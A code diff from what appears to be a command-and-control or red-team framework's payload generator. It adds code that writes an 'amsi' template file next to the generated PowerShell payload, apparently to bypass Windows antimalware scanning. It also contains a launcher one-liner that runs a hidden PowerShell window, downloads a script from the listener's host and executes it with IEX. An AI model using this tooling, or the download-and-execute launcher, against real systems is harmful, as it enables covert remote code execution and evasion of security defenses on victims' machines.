@@ -71,6 +71,9 @@ def powershell(listener, outputname):
 
     with open("./lib/templates/powershell.ps1", "rt") as p:
         payload = p.read()
+    
+    with open("./lib/templates/amsi.ps1", "rt") as n:
+        amsi = n.read()
 
     payload = payload.replace('REPLACE_IP',ip)
     payload = payload.replace('REPLACE_PORT',str(port))
@@ -82,6 +85,9 @@ def powershell(listener, outputname):
     with open("{}{}".format(listeners[listener].filePath, outputname), "wt") as f:
         f.write(payload)
 
+    with open("{}amsi".format(listeners[listener].filePath), "wt") as f:
+        f.write(amsi)
+    
     oneliner = "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/sc/{}\')\"".format(ip, str(port), outputname)
 
     success("File saved in: {}".format(outpath))
